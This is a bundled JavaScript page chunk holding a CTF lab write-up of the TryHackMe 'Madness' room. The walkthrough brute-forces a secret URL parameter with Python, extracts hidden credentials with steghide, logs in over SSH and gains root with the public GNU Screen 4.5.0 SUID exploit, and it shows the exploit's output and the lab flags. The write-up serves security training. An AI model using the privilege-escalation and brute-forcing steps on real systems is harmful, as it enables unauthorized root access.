"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7760],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},p=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(t),m=a,h=u["".concat(l,".").concat(m)]||u[m]||d[m]||o;return t?r.createElement(h,i(i({ref:n},p),{},{components:t})):r.createElement(h,i({ref:n},p))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=m;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[u]="string"==typeof e?e:a,i[1]=s;for(var c=2;c<o;c++)i[c]=t[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},4435:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var r=t(87462),a=(t(67294),t(3905));const o={},i="Madness",s={unversionedId:"Tryhackme/Madness/Madness",id:"Tryhackme/Madness/Madness",title:"Madness",description:"Will you be consumed by Madness?",source:"@site/writeups/Tryhackme/Madness/Madness.md",sourceDirName:"Tryhackme/Madness",slug:"/Tryhackme/Madness/",permalink:"/writeups/Tryhackme/Madness/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Looking Glass",permalink:"/writeups/Tryhackme/Looking Glass/"},next:{title:"Magician",permalink:"/writeups/Tryhackme/Magician/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flag Submission",id:"task-1-flag-submission",level:2}],p={toc:c},u="wrapper";function d(e){let{components:n,...o}=e;return(0,a.kt)(u,(0,r.Z)({},p,o,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"madness"},"Madness"),(0,a.kt)("p",null,"Will you be consumed by Madness?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/madness"},"Madness")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Reverse Engineering"),(0,a.kt)("li",{parentName:"ul"},"Python Scripting (Fuzzing)"),(0,a.kt)("li",{parentName:"ul"},"Steganography"),(0,a.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-flag-submission"},"Task 1 Flag Submission"),(0,a.kt)("p",null,"Please note this challenge does not require SSH brute forcing."),(0,a.kt)("p",null,"Use your skills to access the user and root account!"),(0,a.kt)("p",null,"This room is part of the Turmoil series"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.19.96/"},"view-source:http://10.10.19.96/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<img src="thm.jpg" class="floating_element" />\n\x3c!-- They will never find me--\x3e\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"wget http://10.10.19.96/thm.jpg\n\nkali@kali:~/CTFs/tryhackme/Madness$ xxd thm.jpg | head\n00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............\n00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203  .......C........\n00000020: 0303 0304 0303 0405 0805 0504 0405 0a07  ................\n00000030: 0706 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d  ................\n00000040: 0e11 0e0b 0b10 1610 1113 1415 1515 0c0f  ................\n00000050: 1718 1614 1812 1415 14ff db00 4301 0304  ............C...\n00000060: 0405 0405 0905 0509 140d 0b0d 1414 1414  ................\n00000070: 1414 1414 1414 1414 1414 1414 1414 1414  ................\n00000080: 1414 1414 1414 1414 1414 1414 1414 1414  ................\n00000090: 1414 1414 1414 1414 1414 1414 1414 ffc0  ................\n\nkali@kali:~/CTFs/tryhackme/Madness$ printf '\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01' | dd conv=notrunc of=thm.jpg bs=1\n12+0 records in\n12+0 records out\n12 bytes copied, 8.2589e-05 s, 145 kB/s\n")),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(53338).Z,width:"400",height:"400"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/th1s_1s_h1dd3n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},"#!/usr/bin/env python3\n\nimport requests\n\nhost = '10.10.19.96'\nurl = 'http://{}/th1s_1s_h1dd3n/?secret={}'\n\nfor i in range(100):\n    r = requests.get(url.format(host, i))\n    if not 'That is wrong!' in r.text:\n        print(\"Found secret: {}\".format(i))\n        print(r.text)\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Madness$ python3 hidden_secret.py\nFound secret: 73\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<html>\n  <head>\n    <title>Hidden Directory</title>\n    <link href="stylesheet.css" rel="stylesheet" type="text/css" />\n  </head>\n  <body>\n    <div class="main">\n      <h2>Welcome! I have been expecting you!</h2>\n      <p>To obtain my identity you need to guess my secret!</p>\n      \x3c!-- It\'s between 0-99 but I don\'t think anyone will look here--\x3e\n\n      <p>Secret Entered: 73</p>\n\n      <p>Urgh, you got it right! But I won\'t tell you who I am! y2RPJ4QaPF!B</p>\n    </div>\n  </body>\n</html>\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"y2RPJ4QaPF!B")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf thm.jpg\nEnter passphrase:\nwrote extracted data to \"hidden.txt\".\nkali@kali:~/CTFs/tryhackme/Madness$ cat hidden.txt\nFine you found the password!\n\nHere's a username\n\nwbxre\n\nI didn't say I would make it easy for you!\n\nkali@kali:~/CTFs/tryhackme/Madness$ echo -n \"wbxre\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\njoker\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf 5iW7kC8.jpg\nEnter passphrase:\nwrote extracted data to \"password.txt\".\nkali@kali:~/CTFs/tryhackme/Madness$ cat password.txt\nI didn't think you'd find me! Congratulations!\n\nHere take my password\n\n*axA&GF8dP\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Madness$ ssh joker@10.10.19.96\njoker@10.10.19.96's password:\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Sun Jan  5 18:51:33 2020 from 192.168.244.128\njoker@ubuntu:~$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"joker@ubuntu:~$ ls -la\ntotal 20\ndrwxr-xr-x 3 joker joker 4096 Oct 14 03:08 .\ndrwxr-xr-x 3 root  root  4096 Jan  4  2020 ..\n-rw------- 1 joker joker    0 Jan  5  2020 .bash_history\n-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc\ndrwx------ 2 joker joker 4096 Oct 14 03:08 .cache\n-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt\njoker@ubuntu:~$ cat user.txt\nTHM{d5781e53b130efe2f94f9b0354a5e4ea}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"joker@ubuntu:~$ find / -user root -perm -u=s 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/vmware-user-suid-wrapper\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/sudo\n/bin/fusermount\n/bin/su\n/bin/ping6\n/bin/screen-4.5.0\n/bin/screen-4.5.0.old\n/bin/mount\n/bin/ping\n/bin/umount\njoker@ubuntu:~$ ls -l /bin/screen*\nlrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen -> screen-4.5.0\n-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0\n-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0.old\nlrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen.old -> screen-4.5.0\njoker@ubuntu:~$\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/41154"},"GNU Screen 4.5.0 - Local Privilege Escalation")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'joker@ubuntu:/tmp$ sh 41154.sh\n~ gnu/screenroot ~\n[+] First, we create our shell and library...\n/tmp/libhax.c: In function \u2018dropshell\u2019:\n/tmp/libhax.c:7:5: warning: implicit declaration of function \u2018chmod\u2019 [-Wimplicit-function-declaration]\n     chmod("/tmp/rootshell", 04755);\n     ^\n/tmp/rootshell.c: In function \u2018main\u2019:\n/tmp/rootshell.c:3:5: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]\n     setuid(0);\n     ^\n/tmp/rootshell.c:4:5: warning: implicit declaration of function \u2018setgid\u2019 [-Wimplicit-function-declaration]\n     setgid(0);\n     ^\n/tmp/rootshell.c:5:5: warning: implicit declaration of function \u2018seteuid\u2019 [-Wimplicit-function-declaration]\n     seteuid(0);\n     ^\n/tmp/rootshell.c:6:5: warning: implicit declaration of function \u2018setegid\u2019 [-Wimplicit-function-declaration]\n     setegid(0);\n     ^\n/tmp/rootshell.c:7:5: warning: implicit declaration of function \u2018execvp\u2019 [-Wimplicit-function-declaration]\n     execvp("/bin/sh", NULL, NULL);\n     ^\n[+] Now we create our /etc/ld.so.preload file...\n[+] Triggering...\n\' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.\n[+] done!\nNo Sockets found in /tmp/screens/S-joker.\n\n# id\nuid=0(root) gid=0(root) groups=0(root),1000(joker)\n# cat /root/root.txt\nTHM{5ecd98aa66a6abb670184d7547c8124a}\n')),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"user.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{d5781e53b130efe2f94f9b0354a5e4ea}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"root.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{5ecd98aa66a6abb670184d7547c8124a}")))}d.isMDXComponent=!0},53338:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/thm-10892065d81fa656fa88ad31b4b57edf.jpg"}}]);